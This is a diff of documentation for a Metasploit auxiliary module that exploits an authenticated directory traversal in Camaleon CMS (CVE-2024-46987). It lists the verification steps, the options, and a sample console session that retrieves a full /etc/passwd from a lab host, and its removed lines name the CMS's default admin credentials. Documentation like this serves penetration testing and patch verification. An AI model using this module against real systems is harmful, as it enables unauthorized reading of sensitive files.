@@ -1,24 +1,16 @@
 ## Vulnerable Application
 
-This module attempts to read files from an authenticated directory traversal vuln in Camaleon CMS versions >= 2.8.0 and version 2.9.0
+This module attempts to read files from an authenticated directory traversal vuln in Camaleon CMS versions <= 2.8.0 and version 2.9.0.
 
 CVE-2024-46987 mistakenly indicates that versions 2.8.1 and 2.8.2 are also vulnerable, however this is not the case.
 
 ## Verification Steps
 
 1. Do: `use auxiliary/gather/camaleon_traversal`
-2. Do: `set RHOSTS [IP]`
+2. Do: `set RHOST [IP]`
 3. Do: `run`
 
 ## Options
-
-### username
-
-Valid username. The Camaleon CMS default is "admin".
-
-### password
-
-Valid password. The Camaleon CMS default is "admin123".
 
 ### filepath
 
@@ -28,40 +20,70 @@ The filepath of the file to read.
 
 The number of "../" appended to the filename. Default is 13
 
-### vhost
-
-Target virtual host/domain name. Ex: target.com
-
-### verbose
-
-Get verbose output.
-
-### store_loot
-
-If true, the target file is stored as loot.
-
-Otherwise, the file is printed to stdout.
-
 ## Scenarios
 
 ```
 msf > use auxiliary/gather/camaleon_traversal 
-msf auxiliary(gather/camaleon_traversal) > set ssl false
-[!] Changing the SSL option's value may require changing RPORT!
-ssl => false
 msf auxiliary(gather/camaleon_traversal) > set rhost 10.0.0.45
 rhost => 10.0.0.45
 msf auxiliary(gather/camaleon_traversal) > set rport 3000
 rport => 3000
-msf auxiliary(gather/camaleon_traversal) > set username test
-username => test
-msf auxiliary(gather/camaleon_traversal) > set password password
-password => password
-msf auxiliary(gather/camaleon_traversal) > set autocheck false
-autocheck => false
+msf auxiliary(gather/camaleon_traversal) > set ssl false
+ssl => false
 msf auxiliary(gather/camaleon_traversal) > run
 [*] Running module against 10.0.0.45
-[!] AutoCheck is disabled, proceeding with exploitation
-[+] /etc/passwd stored as '/home/kali/.msf4/loot/20260314231930_default_unknown_camaleon.travers_470222.txt'
+[+] /etc/passwd stored as '/home/kali/.msf4/loot/20260411192711_default_10.0.0.45_camaleon.travers_926890.txt'
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+syslog:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
+usbmux:x:104:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+tss:x:105:105:TPM software stack,,,:/var/lib/tpm:/bin/false
+systemd-oom:x:990:990:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+whoopsie:x:107:109::/nonexistent:/bin/false
+dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+avahi:x:108:111:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+tcpdump:x:109:112::/nonexistent:/usr/sbin/nologin
+sssd:x:110:113:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+cups-pk-helper:x:112:114:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+saned:x:113:116::/var/lib/saned:/usr/sbin/nologin
+geoclue:x:114:117::/var/lib/geoclue:/usr/sbin/nologin
+cups-browsed:x:115:114::/nonexistent:/usr/sbin/nologin
+hplip:x:116:7:HPLIP system user,,,:/run/hplip:/bin/false
+gnome-remote-desktop:x:988:988:GNOME Remote Desktop:/var/lib/gnome-remote-desktop:/usr/sbin/nologin
+polkitd:x:987:987:User for polkitd:/:/usr/sbin/nologin
+rtkit:x:117:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
+colord:x:118:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+gnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:120:121:Gnome Display Manager:/var/lib/gdm3:/bin/false
+nm-openvpn:x:121:122:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+bittman:x:1000:1000:bittman:/home/bittman:/bin/bash
+postgres:x:122:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
 [*] Auxiliary module execution completed
 ```
